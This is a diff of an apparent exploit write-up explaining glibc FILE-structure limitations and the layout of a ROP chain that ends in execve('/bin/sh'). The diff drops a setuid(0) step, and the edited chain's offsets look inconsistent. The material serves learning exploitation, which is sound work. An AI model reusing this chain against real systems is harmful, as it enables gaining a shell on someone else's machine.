@@ -609,19 +609,14 @@ pwndbg> tele 0x7f4672919d00 1
 00:0000│     0x7f4672919d00 (_nl_archive_subfreeres+96) ◂— ret
 ```
 
-Second limitation is that \_IO_write_base has to be null, so we can't place a gadget address there, we can workaround it by popping a 0x0 into a register. Third limitation is that \_IO_buf_base has to be null, we can apply the same approach as in \_IO_write_base. The final limitation is that we can't overwrite the lock field, this is at offset 0x88, so we have 0x88/0x8 = 17 qwords to ROP. That is plenty of space. This the layout of our ROP chain in ace.py:
+Second limitation is that \_IO_write_base has to be null, so we can't place a gadget address there, we can workaround it by popping a 0x0 into a register. Third limitation is that \_IO_buf_base has to be null, we can apply the same approach as in \_IO_write_base. The final limitation is that we can't overwrite the lock field, this is at offset 0x88, so we have 0x88/0x8 = 17 qwords to ROP, that is plenty of space. This the layout of our ROP chain in ace.py:
 
 ```
 0x00: _nl_archive_subfreeres+96 # pointer to ret instruction with least significant byte as 0x00
 0x08: pop rdi gadget
-0x10: 0x0000000000000000
-0x18: pop rdi gadget
+0x10: "/bin/sh" string in libc
+0x18: pop rsi gadget
 0x20: 0x0000000000000000	# _IO_write_base as NULL
-0x28: address of setuid		# calling setuid(0), to prevent bash from dropping priviledges
-0x30: pop rsi gadget
-0x38: 0x0000000000000000	# _IO_buf_base as NULL
-0x40: pop rdi gadget
-0x48: "/bin/sh" string in libc
 0x50: address to execve		# call execve("/bin/sh", NULL)
 ```
 
